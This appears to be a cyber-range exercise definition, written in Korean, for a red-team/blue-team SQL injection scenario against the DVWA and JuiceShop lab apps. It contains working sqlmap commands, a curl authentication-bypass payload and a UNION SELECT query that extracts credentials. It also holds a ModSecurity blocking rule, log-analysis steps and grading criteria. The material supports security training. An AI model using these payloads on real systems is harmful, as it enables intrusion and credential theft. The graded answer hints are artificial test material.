@@ -1,0 +1,267 @@
+id: "sqli-vs-waf"
+title: "SQL Injection vs WAF 방어"
+description: "내부 감사 결과 웹 애플리케이션에 SQL Injection 취약점이 존재할 가능성이 보고되었다. Red Team은 JuiceShop과 DVWA를 대상으로 SQLi를 통해 인증을 우회하고 데이터를 추출해야 한다. Blue Team은 ModSecurity WAF 로그를 분석하고 차단 룰을 강화하여 공격을 무력화해야 한다."
+difficulty: "easy"
+time_limit: 1800
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "sqlmap을 사용하여 DVWA(http://10.20.30.80:8080)의 로그인 페이지에 SQLi 취약점이 있는지 테스트하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --level=1"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "sqlmap"
+      semantic:
+        intent: "DVWA SQLi 취약 파라미터(id) 자동 탐지 — sqlmap의 boolean/error/time-based 휴리스틱으로 injectable 여부 확인. PTES Discovery + OWASP A03 (Injection) 학습 도입."
+        success_criteria:
+          - "sqlmap 실행 + DVWA URL 대상 (id 또는 Submit 파라미터)"
+          - "PHPSESSID + security=low 쿠키 전달 (인증된 컨텍스트)"
+          - "출력에 'parameter ... is vulnerable' 또는 'available techniques' 같은 sqlmap injectable 판정 메시지"
+        acceptable_methods:
+          - "sqlmap -u <url> --cookie=... --batch (자동 응답)"
+          - "sqlmap -r <request.txt> --batch (캡처된 raw HTTP request 사용)"
+          - "manual fuzzing — curl 'id=1%27' 로 syntax error 확인 후 sqlmap 보강"
+        negative_signs:
+          - "sqlmap 미설치 또는 alias 누락 — 명령 자체 실패"
+          - "쿠키 누락 → 로그인 페이지 redirect 만 받고 파라미터 안 보임"
+          - "--batch 없이 interactive 입력 대기 (CI/자동화 부적합)"
+
+  - order: 2
+    instruction: "JuiceShop(http://10.20.30.80:3000)의 로그인 페이지에서 SQLi로 관리자 인증을 우회하라. curl을 사용하라."
+    hint: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' or 1=1--\",\"password\":\"a\"}'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "token"
+      semantic:
+        intent: "JuiceShop /rest/user/login 의 email 필드 SQLi 인증 우회 — `' or 1=1--` 페이로드로 SQL 절단 + 항상-참 → 첫 사용자(admin) 매칭. JWT 또는 authentication token 발급 응답이 성공 신호. OWASP A07 (Identification/Auth Failures) + A03."
+        success_criteria:
+          - "curl POST /rest/user/login + Content-Type: application/json"
+          - "email 페이로드에 SQLi 패턴 (' or 1=1-- 또는 동등)"
+          - "응답 JSON 에 authentication.token (JWT) 또는 status 200 + bid 포함"
+        acceptable_methods:
+          - "curl -X POST -d JSON 페이로드 직접"
+          - "Burp Repeater 로 reproduce"
+          - "sqlmap --form 또는 --data 로 자동화"
+          - "python requests.post 스크립트"
+        negative_signs:
+          - "응답에 Invalid email or password (SQLi 차단됨)"
+          - "JSON quoting 오류로 페이로드 깨짐 (단일/이중 인용 escape)"
+          - "token 없이 그냥 200 만 받고 우회 증명 안 함"
+
+  - order: 3
+    instruction: "sqlmap으로 DVWA의 데이터베이스 목록을 열거하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --dbs"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "available databases"
+      semantic:
+        intent: "확인된 SQLi 를 활용해 DBMS 메타데이터(데이터베이스 목록) 추출 — information_schema.schemata 또는 mysql.user 같은 시스템 카탈로그 enumeration. PTES Vulnerability Analysis → Exploitation 단계."
+        success_criteria:
+          - "sqlmap --dbs 옵션 (또는 --current-db / --tables 등 enumeration 액션)"
+          - "출력에 'available databases [n]:' 헤더 + 1개 이상 DB 이름 (dvwa/information_schema/mysql 등)"
+          - "Order #1 에서 식별한 동일 injection 포인트 재사용"
+        acceptable_methods:
+          - "sqlmap --dbs"
+          - "sqlmap --current-db (현재 사용중 DB만)"
+          - "manual: curl 'id=1 UNION SELECT 1,schema_name FROM information_schema.schemata--'"
+        negative_signs:
+          - "sqlmap session resume 안 됨 → 매번 처음부터 (속도 손실)"
+          - "DB 목록 추출 안 하고 단순 'is vulnerable' 만 재확인"
+          - "출력 잘림 (head/tail 잘못 적용)"
+
+  - order: 4
+    instruction: "UNION SELECT 기법을 사용하여 DVWA에서 사용자 테이블 정보를 추출하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user,password+FROM+users--+&Submit=Submit' -b 'security=low; PHPSESSID=test'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "admin"
+      semantic:
+        intent: "UNION-based SQLi 로 DVWA users 테이블에서 자격증명 추출 — column count 매칭 + 응답에 두 컬럼 (user, password) 노출. password 가 hash (MD5) 형식 — 이후 john/hashcat 으로 크랙하는 cred-access 체인의 시작."
+        success_criteria:
+          - "UNION SELECT 페이로드에 users 테이블 + user/password 컬럼"
+          - "% URL 인코딩 (%27 = ', %20 = space) 정확히 적용"
+          - "응답 HTML 에 'admin' (또는 다른 시드 사용자) 행 + 32자 hex (MD5) 값 노출"
+        acceptable_methods:
+          - "curl GET id=' UNION SELECT user,password FROM users--"
+          - "sqlmap --dump -T users -D dvwa"
+          - "Burp Intruder 로 column count fuzz 후 UNION"
+          - "browser 직접 URL 입력 (수동 검증)"
+        negative_signs:
+          - "column count 불일치 → 'The used SELECT statements have a different number of columns'"
+          - "쿠키 (security=low + PHPSESSID) 누락 → 로그인 redirect"
+          - "UNION 페이로드는 보냈는데 admin/hash 미노출 (잘못된 컬럼/테이블)"
+
+  - order: 5
+    instruction: "JuiceShop에서 검색 기능의 SQLi 취약점을 테스트하라."
+    hint: "curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "data"
+      semantic:
+        intent: "JuiceShop /rest/products/search 의 q 파라미터 SQLi — 동적 SQL concat 으로 인한 인젝션. 정상은 q='test' → 매칭 X 라 빈 배열. 페이로드 ' OR 1=1-- 로 항상-참 → 전체 products 노출. CRUD endpoint 의 무차별 노출 + OWASP A03."
+        success_criteria:
+          - "curl GET /rest/products/search?q= 에 SQLi 페이로드 (' OR 1=1-- 또는 동등)"
+          - "URL 인코딩 (%27 ' / %20 space) 정확"
+          - "응답 JSON 의 data 배열 길이가 일반 검색 결과보다 큼 (전체 product dump)"
+        acceptable_methods:
+          - "curl -s '/rest/products/search?q=...' (단일 URL 호출)"
+          - "sqlmap -u '/rest/products/search?q=test*' --batch"
+          - "Postman/Insomnia 로 reproduce"
+        negative_signs:
+          - "정상 검색 응답 (data 배열 0~수 건만)"
+          - "500 SQL syntax error 만 받고 leak 증명 안 함 (참고용 OK 지만 mission 미달)"
+          - "URL 인코딩 부정확 → URL 파싱 단계에서 페이로드 깨짐"
+
+blue_missions:
+  - order: 1
+    instruction: "ModSecurity 감사 로그에서 SQL Injection 탐지 이벤트를 확인하라."
+    hint: "cat /var/log/apache2/modsec_audit.log | grep -i 'sql' | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "SQL"
+      semantic:
+        intent: "ModSecurity audit log 에서 OWASP CRS rule 942xxx (SQLi 카테고리) 트리거 이벤트 확인 — Red 의 sqlmap/curl 페이로드가 WAF 에 detected 됐는지. SOC 의 rule-tuning 출발점."
+        success_criteria:
+          - "modsec_audit.log 또는 동등 path 읽기"
+          - "grep 으로 SQL/sqli/942 등 rule id 또는 카테고리 매칭"
+          - "최소 1개 이벤트의 rule msg/match/url 확인 (단순 grep 카운트만 아님)"
+        acceptable_methods:
+          - "cat + grep -i 'sql\\|union\\|select' modsec_audit.log"
+          - "tail -f 로 실시간 감지 (Red 가 미션 진행 중일 때)"
+          - "jq 로 JSON audit log 파싱 (modsec3+)"
+          - "logwatch / fail2ban 통합 query"
+        negative_signs:
+          - "log path 잘못 (apache2 vs httpd, modsec3 변경)"
+          - "audit log 가 비어 있음 → SecAuditEngine off 또는 rule 미적용"
+          - "단순 grep count 만 출력 + 어떤 rule/url 인지 분석 없음"
+
+  - order: 2
+    instruction: "Apache 에러 로그에서 SQLi 공격 흔적을 분석하라."
+    hint: "cat /var/log/apache2/error.log | grep -i 'ModSecurity' | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "ModSecurity"
+      semantic:
+        intent: "Apache error.log 의 ModSecurity 차단/경고 라인 분석 — audit log 보다 가볍지만 즉시 SOC 에 보임. 어떤 client_ip + URL + rule_id 가 매칭됐는지 추출."
+        success_criteria:
+          - "/var/log/apache2/error.log (또는 distro 별 path) 읽기"
+          - "ModSecurity 라인 추출 (Warning/Access denied 등)"
+          - "rule id [id \"94xxxx\"] + client IP + 매칭된 페이로드 확인"
+        acceptable_methods:
+          - "cat + grep -i ModSecurity error.log"
+          - "journalctl -u apache2 -g ModSecurity"
+          - "awk 로 rule id 추출 후 빈도 정렬"
+        negative_signs:
+          - "에러 로그 비어 있음 (LogLevel 너무 낮거나 ModSecurity off)"
+          - "ModSecurity 라인 없이 일반 access 로그만 출력"
+          - "rule id/client ip 추출 없이 raw 덤프만"
+
+  - order: 3
+    instruction: "ModSecurity에 UNION SELECT 패턴을 차단하는 커스텀 룰을 추가하라."
+    hint: "echo 'SecRule ARGS \"union.*select\" \"id:100001,phase:2,deny,status:403,msg:Custom SQLi Block\"' >> /etc/modsecurity/custom-rules.conf"
+    points: 20
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "Red #4 의 UNION SELECT 페이로드를 차단하는 ModSecurity 커스텀 SecRule 추가 — phase:2 (request body), action deny + 403, 고유 id (1만번대 reserved). OWASP CRS 위에 사이트별 보강."
+        success_criteria:
+          - "/etc/modsecurity/ (또는 conf-enabled) 의 .conf 파일에 SecRule 추가"
+          - "rule id 가 reserved 영역 (1~99999 user-defined)"
+          - "ARGS|REQUEST_BODY 등 적절한 변수 + union.*select pcre 패턴"
+          - "action: deny + status:403 + 의미있는 msg"
+        acceptable_methods:
+          - "echo 'SecRule ...' >> custom-rules.conf"
+          - "vim/sed 로 직접 편집"
+          - "Ansible/Salt 로 template 배포"
+        negative_signs:
+          - "rule id 충돌 (CRS 942xxx 영역 사용)"
+          - "phase:1 (header only) 로 body 페이로드 못 잡음"
+          - "deny 대신 pass — block 효과 0"
+
+  - order: 4
+    instruction: "Apache를 재시작하여 새 룰을 적용하고 정상 동작을 확인하라."
+    hint: "systemctl reload apache2 && systemctl status apache2 | head -5"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "active"
+      semantic:
+        intent: "ModSecurity 룰 리로드 → 즉시 적용. systemctl reload 가 graceful (기존 connection 유지). 운영 환경 표준 — restart 보다 reload 우선."
+        success_criteria:
+          - "systemctl reload apache2 (또는 apachectl graceful)"
+          - "systemctl status 로 active (running) 상태 확인"
+          - "syntax error 없이 reload 완료"
+        acceptable_methods:
+          - "systemctl reload apache2 + status"
+          - "apachectl graceful + apachectl status"
+          - "service apache2 reload (legacy)"
+          - "apachectl configtest 후 reload (best practice)"
+        negative_signs:
+          - "stop + start 로 connection 끊김"
+          - "configtest 누락 → syntax error 시 down"
+          - "status 미확인 — reload 성공 여부 확인 부족"
+
+  - order: 5
+    instruction: "Wazuh에서 SQL Injection 관련 알림을 확인하라."
+    hint: "cat /var/ossec/logs/alerts/alerts.json | tail -50 | grep -i 'sql'"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "sql"
+      semantic:
+        intent: "Wazuh alerts.json (JSON-line) 에서 ModSecurity decoder 가 생성한 SQLi 카테고리 alert 추출 — SIEM 차원의 가시성 확보. SOC 가 dashboard 외 CLI 로 즉답 가능해야."
+        success_criteria:
+          - "/var/ossec/logs/alerts/alerts.json 읽기"
+          - "grep -i 'sql\\|sqli\\|injection' 또는 jq '.rule.groups[]==\"sqli\"' 매칭"
+          - "최소 1개 alert 의 rule.id + agent.name + full_log 노출"
+        acceptable_methods:
+          - "cat + tail + grep alerts.json"
+          - "jq -r '.rule.description' alerts.json | grep -i sql"
+          - "Wazuh API: GET /security/agents/<id>/alerts"
+          - "Kibana/OpenSearch query"
+        negative_signs:
+          - "alerts.json 비어있음 — agent 미연결 또는 ModSecurity decoder off"
+          - "grep 결과 0 — Red 미션이 아직 진행 중이거나 룰 매칭 안 됨"
+          - "raw 덤프만 + rule id/desc 분석 없음"
+
+  - order: 6
+    instruction: "suricata에서 SQLi 시그니처 탐지 로그를 확인하라."
+    hint: "grep -i 'sql' /var/log/suricata/fast.log | tail -10"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "SQL"
+      semantic:
+        intent: "Suricata IDS 의 ET (Emerging Threats) 또는 ETPRO sql_injection 카테고리 시그니처 매칭 — 네트워크 레벨 탐지. WAF (HTTP layer) 와 별개의 방어막. fast.log 는 1줄 요약, eve.json 은 상세."
+        success_criteria:
+          - "/var/log/suricata/fast.log 또는 eve.json 읽기"
+          - "grep -i 'sql\\|injection' 매칭"
+          - "최소 1개 alert 의 sid + msg + classification 노출"
+        acceptable_methods:
+          - "grep fast.log + tail"
+          - "jq '.event_type==\"alert\"' eve.json | grep sql"
+          - "suricatasc -c 'iface-stat' 로 traffic 확인"
+        negative_signs:
+          - "Suricata 미실행 또는 룰셋 (suricata-update) 누락"
+          - "fast.log 비어있음 — Red traffic 이 secu 경유 안 함"
+          - "alert 보이지만 sid/msg 분석 없이 raw 출력"
